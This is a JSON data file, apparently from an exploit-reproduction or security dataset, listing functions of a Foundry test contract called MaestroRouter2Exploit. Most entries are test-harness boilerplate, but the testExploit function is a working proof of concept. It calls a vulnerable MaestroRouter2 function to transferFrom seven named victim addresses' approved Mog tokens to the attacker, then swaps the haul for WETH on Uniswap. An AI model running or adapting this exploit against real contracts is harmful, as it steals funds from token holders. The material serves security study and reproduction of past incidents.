[
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\");\n\n        cheats.label(address(router), \"MaestroRouter2\");\n        cheats.label(address(router_logic), \"MaestroRouter2 Logic Contract\");\n        cheats.label(address(Mog), \"Mog Token\");\n        cheats.label(address(UniRouter), \"UniswapRouterV2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MaestroRouter2Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        cheats.rollFork(18_423_219);\n        emit log_named_decimal_uint(\"Attacker Mog balance before exploit\", Mog.balanceOf(address(this)), Mog.decimals());\n\n        address[] memory victims = new address[](7);\n        victims[0] = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;\n        victims[1] = 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D;\n        victims[2] = 0xe84180bdc970c01B30a326f610F110acB23EcdBe;\n        victims[3] = 0x6476425a65Ae09e22383B68416b32AbE62896aa9;\n        victims[4] = 0x942beCA935703058E26527d0bD49D00E85841772;\n        victims[5] = 0x968907878bDF60638FFdD5E4759289941333bf94;\n        victims[6] = 0xA5162195e6CB7483eea8bA878d147b0E90519c64;\n        bytes4 vulnFunctionSignature = hex\"9239127f\";\n        for (uint256 i = 0; i < victims.length; i++) {\n            uint256 allowance = Mog.allowance(victims[i], address(router));\n            uint256 balance = Mog.balanceOf(victims[i]);\n            balance = allowance < balance ? allowance : balance;\n            bytes memory transferFromData =\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), balance);\n            bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, Mog, transferFromData, uint8(0), false);\n            (bool success,) = address(router).call(data);\n        }\n        uint256 MogBalance = Mog.balanceOf(address(this));\n        emit log_named_decimal_uint(\"Attacker Mog balance after exploit\", MogBalance, Mog.decimals());\n\n        address[] memory path = new address[](2);\n        path[0] = address(Mog);\n        path[1] = address(WETH);\n        Mog.approve(address(UniRouter), MogBalance);\n        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            MogBalance, 0, path, address(this), block.timestamp\n        );\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", WETH.balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  }
]